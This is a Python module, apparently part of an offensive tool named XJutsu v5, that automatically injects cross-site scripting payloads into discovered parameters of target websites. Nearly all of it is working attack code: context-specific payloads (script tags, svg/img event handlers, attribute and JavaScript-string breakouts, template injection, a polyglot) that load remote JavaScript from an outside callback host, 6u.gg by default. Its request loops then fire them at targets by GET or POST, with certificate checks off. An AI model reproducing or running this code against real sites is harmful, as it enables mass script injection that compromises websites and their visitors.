"""
XJutsu v5 - Payload Injector
by Dave Lester B. Mondina / ANBU Black Ops Security

Auto-inject XJutsu payloads into discovered injection points.
"""

import re
import time
import random
import hashlib
import logging
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from enum import Enum

import requests

from .extractor import InjectionPoint, InjectionContext

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Type of XSS payload"""
    SCRIPT_SRC = "script_src"      # <script src=//domain>
    IMG_ONERROR = "img_onerror"    # <img src=x onerror=...>
    SVG_ONLOAD = "svg_onload"      # <svg onload=...>
    BODY_ONLOAD = "body_onload"    # <body onload=...>
    EVENT_HANDLER = "event"        # " onfocus=... autofocus
    JS_BREAK = "js_break"          # ";alert()//
    TEMPLATE = "template"          # {{constructor.constructor('...')()}}
    HREF_JS = "href_js"            # javascript:...
    POLYGLOT = "polyglot"          # Multi-context payload


@dataclass
class InjectionResult:
    """Result of payload injection"""
    injection_point: InjectionPoint
    payload_type: PayloadType
    payload: str
    tracking_id: str
    injected_url: str
    method: str
    timestamp: datetime = field(default_factory=datetime.now)
    status_code: int = 0
    success: bool = False
    error: Optional[str] = None


class PayloadInjector:
    """
    Inject XJutsu payloads into discovered injection points.

    Features:
    - Context-aware payload selection
    - Unique tracking ID per injection
    - Multiple payload variants
    - Rate limiting
    """

    def __init__(
        self,
        xjutsu_domain: str = "6u.gg",
        callback_endpoint: str = "/poly.js",
        timeout: int = 10,
        delay: float = 0.5,
        headers: Dict = None,
        cookies: Dict = None,
        verify_ssl: bool = False,
    ):
        """
        Initialize the injector.

        Args:
            xjutsu_domain: Your XJutsu domain (e.g., 6u.gg)
            callback_endpoint: Endpoint for callbacks
            timeout: Request timeout
            delay: Delay between injections
            headers: Custom headers
            cookies: Custom cookies
            verify_ssl: Verify SSL certificates
        """
        self.xjutsu_domain = xjutsu_domain
        self.callback_endpoint = callback_endpoint
        self.timeout = timeout
        self.delay = delay
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.verify_ssl = verify_ssl
        self.session = requests.Session()

        # Track injections
        self.injections: List[InjectionResult] = []

    def _generate_tracking_id(self, url: str, param: str) -> str:
        """Generate unique tracking ID for this injection"""
        unique = f"{url}:{param}:{time.time()}:{random.random()}"
        return hashlib.md5(unique.encode()).hexdigest()[:12]

    def _get_callback_url(self, tracking_id: str, target_url: str, param: str) -> str:
        """Generate callback URL with tracking info"""
        # Encode target info in the tracking ID
        return f"//{self.xjutsu_domain}{self.callback_endpoint}?t={tracking_id}&u={urlparse(target_url).netloc}&p={param}"

    def _generate_payloads(self, context: InjectionContext, tracking_id: str, target_url: str, param: str) -> List[Tuple[PayloadType, str]]:
        """Generate context-appropriate payloads"""
        callback = self._get_callback_url(tracking_id, target_url, param)
        payloads = []

        # Script src - works in most HTML contexts
        if context in (InjectionContext.HTML_TEXT, InjectionContext.UNKNOWN):
            payloads.extend([
                (PayloadType.SCRIPT_SRC, f'<script src={callback}></script>'),
                (PayloadType.SCRIPT_SRC, f'<script/src={callback}>'),
                (PayloadType.SVG_ONLOAD, f'<svg/onload=import(`https:{callback}`)>'),
                (PayloadType.IMG_ONERROR, f'<img src=x onerror=import(`https:{callback}`)>'),
                (PayloadType.SVG_ONLOAD, f'<svg onload="s=document.createElement(`script`);s.src=`https:{callback}`;document.head.appendChild(s)">'),
            ])

        # Attribute context - break out
        if context == InjectionContext.HTML_ATTRIBUTE:
            payloads.extend([
                (PayloadType.EVENT_HANDLER, f'" onfocus="import(`https:{callback}`)" autofocus="'),
                (PayloadType.EVENT_HANDLER, f"' onfocus='import(`https:{callback}`)' autofocus='"),
                (PayloadType.EVENT_HANDLER, f'" onmouseover="import(`https:{callback}`)" style="position:fixed;top:0;left:0;width:100%;height:100%'),
                (PayloadType.SCRIPT_SRC, f'"><script src={callback}></script><x y="'),
            ])

        # Unquoted attribute - easier to break
        if context == InjectionContext.HTML_ATTRIBUTE_UNQUOTED:
            payloads.extend([
                (PayloadType.EVENT_HANDLER, f' onfocus=import(`https:{callback}`) autofocus '),
                (PayloadType.SCRIPT_SRC, f'><script src={callback}></script><x y='),
            ])

        # href/src context - javascript: or break out
        if context == InjectionContext.HTML_HREF:
            payloads.extend([
                (PayloadType.HREF_JS, f'javascript:import(`https:{callback}`)'),
                (PayloadType.HREF_JS, f'javascript:s=document.createElement(`script`);s.src=`https:{callback}`;document.head.appendChild(s)'),
                (PayloadType.SCRIPT_SRC, f'"><script src={callback}></script><x y="'),
            ])

        # Event handler context - already in JS
        if context == InjectionContext.HTML_EVENT:
            payloads.extend([
                (PayloadType.JS_BREAK, f"');import(`https:{callback}`);//"),
                (PayloadType.JS_BREAK, f'");import(`https:{callback}`);//'),
                (PayloadType.JS_BREAK, f"`);import(`https:{callback}`);//"),
            ])

        # JS string context
        if context == InjectionContext.JS_STRING:
            payloads.extend([
                (PayloadType.JS_BREAK, f"';import(`https:{callback}`);//"),
                (PayloadType.JS_BREAK, f'";import(`https:{callback}`);//'),
                (PayloadType.JS_BREAK, f"\\';import(`https:{callback}`);//"),
                (PayloadType.JS_BREAK, f'</script><script src={callback}></script>'),
            ])

        # JS code context
        if context == InjectionContext.JS_CODE:
            payloads.extend([
                (PayloadType.JS_BREAK, f";import(`https:{callback}`);//"),
                (PayloadType.JS_BREAK, f"};import(`https:{callback}`);//"),
                (PayloadType.JS_BREAK, f")};import(`https:{callback}`);//"),
            ])

        # CSS context
        if context == InjectionContext.CSS_VALUE:
            payloads.extend([
                (PayloadType.SCRIPT_SRC, f'"><script src={callback}></script><x style="'),
                (PayloadType.SCRIPT_SRC, f"'><script src={callback}></script><x style='"),
            ])

        # Comment context
        if context == InjectionContext.COMMENT:
            payloads.extend([
                (PayloadType.SCRIPT_SRC, f'--><script src={callback}></script><!--'),
            ])

        # Template injection (Vue, Angular)
        if context in (InjectionContext.HTML_TEXT, InjectionContext.UNKNOWN):
            payloads.extend([
                (PayloadType.TEMPLATE, f"{{{{constructor.constructor('import(`https:{callback}`)')()}}}}"),
                (PayloadType.TEMPLATE, f"${{{{import(`https:{callback}`)}}}}"),
            ])

        # Polyglot - try multiple contexts
        polyglot = f"'\"--><script src={callback}></script><svg/onload=import(`https:{callback}`)>"
        payloads.append((PayloadType.POLYGLOT, polyglot))

        return payloads

    def _inject_param(self, url: str, param: str, value: str, method: str = 'GET', form_data: Dict = None) -> Tuple[str, Dict]:
        """Inject value into parameter"""
        if method.upper() == 'GET':
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            return new_url, {}
        else:
            data = (form_data or {}).copy()
            data[param] = value
            return url, data

    def inject_single(
        self,
        injection_point: InjectionPoint,
        payload_type: PayloadType = None,
    ) -> List[InjectionResult]:
        """
        Inject payloads into a single injection point.

        Args:
            injection_point: The injection point to test
            payload_type: Specific payload type (or None for all applicable)

        Returns:
            List of injection results
        """
        results = []
        tracking_id = self._generate_tracking_id(injection_point.url, injection_point.param)

        # Generate payloads for this context
        payloads = self._generate_payloads(
            injection_point.context,
            tracking_id,
            injection_point.url,
            injection_point.param
        )

        # Filter by payload type if specified
        if payload_type:
            payloads = [(pt, p) for pt, p in payloads if pt == payload_type]

        for ptype, payload in payloads:
            try:
                # Inject payload
                injected_url, form_data = self._inject_param(
                    injection_point.url,
                    injection_point.param,
                    payload,
                    injection_point.method,
                    injection_point.form_data
                )

                # Make request
                if injection_point.method.upper() == 'GET':
                    response = self.session.get(
                        injected_url,
                        headers=self.headers,
                        cookies=self.cookies,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=True,
                    )
                else:
                    response = self.session.post(
                        injection_point.url,
                        data=form_data,
                        headers=self.headers,
                        cookies=self.cookies,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=True,
                    )

                result = InjectionResult(
                    injection_point=injection_point,
                    payload_type=ptype,
                    payload=payload,
                    tracking_id=tracking_id,
                    injected_url=injected_url if injection_point.method.upper() == 'GET' else injection_point.url,
                    method=injection_point.method,
                    status_code=response.status_code,
                    success=True,
                )

            except Exception as e:
                result = InjectionResult(
                    injection_point=injection_point,
                    payload_type=ptype,
                    payload=payload,
                    tracking_id=tracking_id,
                    injected_url=injection_point.url,
                    method=injection_point.method,
                    success=False,
                    error=str(e),
                )

            results.append(result)
            self.injections.append(result)

            # Delay between injections
            if self.delay > 0:
                time.sleep(self.delay)

        return results

    def inject_multiple(
        self,
        injection_points: List[InjectionPoint],
        max_payloads_per_point: int = 3,
    ) -> List[InjectionResult]:
        """
        Inject payloads into multiple injection points.

        Args:
            injection_points: List of injection points
            max_payloads_per_point: Max payloads to try per point

        Returns:
            List of all injection results
        """
        all_results = []

        for point in injection_points:
            if not point.reflects:
                logger.debug(f"Skipping non-reflecting point: {point.url} - {point.param}")
                continue

            tracking_id = self._generate_tracking_id(point.url, point.param)
            payloads = self._generate_payloads(point.context, tracking_id, point.url, point.param)

            # Limit payloads
            payloads = payloads[:max_payloads_per_point]

            for ptype, payload in payloads:
                try:
                    injected_url, form_data = self._inject_param(
                        point.url, point.param, payload,
                        point.method, point.form_data
                    )

                    if point.method.upper() == 'GET':
                        response = self.session.get(
                            injected_url,
                            headers=self.headers,
                            cookies=self.cookies,
                            timeout=self.timeout,
                            verify=self.verify_ssl,
                            allow_redirects=True,
                        )
                    else:
                        response = self.session.post(
                            point.url,
                            data=form_data,
                            headers=self.headers,
                            cookies=self.cookies,
                            timeout=self.timeout,
                            verify=self.verify_ssl,
                            allow_redirects=True,
                        )

                    result = InjectionResult(
                        injection_point=point,
                        payload_type=ptype,
                        payload=payload,
                        tracking_id=tracking_id,
                        injected_url=injected_url,
                        method=point.method,
                        status_code=response.status_code,
                        success=True,
                    )

                    logger.info(f"Injected: {point.url} [{point.param}] -> {ptype.value}")

                except Exception as e:
                    result = InjectionResult(
                        injection_point=point,
                        payload_type=ptype,
                        payload=payload,
                        tracking_id=tracking_id,
                        injected_url=point.url,
                        method=point.method,
                        success=False,
                        error=str(e),
                    )
                    logger.error(f"Injection failed: {e}")

                all_results.append(result)
                self.injections.append(result)

                if self.delay > 0:
                    time.sleep(self.delay)

        return all_results

    def get_pending_verifications(self) -> Dict[str, InjectionResult]:
        """Get mapping of tracking IDs to injection results for verification"""
        return {inj.tracking_id: inj for inj in self.injections if inj.success}
